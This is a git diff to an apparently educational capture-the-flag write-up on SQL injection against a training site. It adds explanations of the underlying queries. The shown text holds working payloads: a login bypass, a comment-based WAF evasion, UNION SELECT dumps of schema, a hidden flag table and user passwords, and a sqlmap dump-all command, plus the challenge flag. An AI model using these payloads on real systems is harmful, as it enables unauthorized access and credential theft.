@@ -29,8 +29,18 @@ I've probably could have guest that the first time by just looking at the length
 
 No answer needed
 
+We can assume the SQL query looks something like this:
+```sql
+SELECT username,password FROM users WHERE username='?' and password = '?'
+```
+The user input goes where there are `?`
+
 I manged to bypass the login form with a simple SQLi: `' or 1=1 --`
 
+So the sql query would look something like this
+```sql
+SELECT username,password FROM users WHERE username='' or 1=1 --' and password = ''
+```
 - Note: The challange suggest there's a WAF preventing spaces, but I didn't had this problem in my SQLi
 However if they do change it in the future all you need to do is replace every space with a comment:
 `' or 1=1 --` -> `'/**/or/**/1=1/**/--`.
@@ -67,20 +77,37 @@ sqlmap -p search -r req --tamper=space2comment --dbms sqlite --batch --dump-all
 ```
 - The `req` file is the request I captured with Burpsuite like they showed above. 
 ---
-Moving on I first tried to see if there are really only 2 columns like we can see in the website so I searched:
+Moving on I first tried to see if there are really only 2 columns like we can see in the website:
+
+First I Tried to assume how the query looks like:
+```
+SELECT gift,kid FROM table WHERE kid LIKE '?'
+```
+
+and so we can try 
 ```
 ' ORDER BY 1,2,3 --
 ```
-And got a lovely error message telling me *3rd ORDER BY term out of range - should be between 1 and 2* so I know there's only 2 columns
+
+and the query will look like this
+```sql
+SELECT gift,kid FROM table WHERE kid LIKE '' ORDER BY 1,2,3 --'
+```
+And I got a lovely error message telling me *3rd ORDER BY term out of range - should be between 1 and 2* so I know there's only 2 columns
 after that using https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet this great cheatsheet for sqlite sqli's
 
 I entered:
 ```
 @' UNION SELECT sql,1 FROM sqlite_master WHERE type='table' --
 ```
+
+And so the query would look something like this:
+```sql
+SELECT gift,kid FROM table WHERE kid LIKE '@' UNION SELECT sql,1 FROM sqlite_master WHERE type='table' --'
+```
 - Note: the `@` is not necessary but for a cleaner input I put a charecter that is not in the gifts database.
 
-and got this:
+And got this:
 
 ![Table names](./screenshots/table_names.png)
 
@@ -93,6 +120,12 @@ so with a simple sql query I could see the contents of hidden_table:
 ```
 @' UNION SELECT flag,1 FROM hidden_table --
 ```
+
+And so the query would something like this:
+```
+SELECT gift,kid FROM table WHERE kid LIKE '@' UNION SELECT flag,1 FROM hidden_table --'
+```
+
 ![Flag](./screenshots/flag.png)
 
 And so the flag is: `thmfox{All_I_Want_for_Christmas_Is_You}`
@@ -103,6 +136,11 @@ And so the flag is: `thmfox{All_I_Want_for_Christmas_Is_You}`
 Same as before I will look at the `users` table, like a so:
 ```
 @' UNION SELECT username,password FROM users --
+```
+
+And so the query would something like this:
+```
+SELECT gift,kid FROM table WHERE kid LIKE '@' UNION SELECT username,password FROM users --'
 ```
 And I get just a single entry which is the admin's password:
 
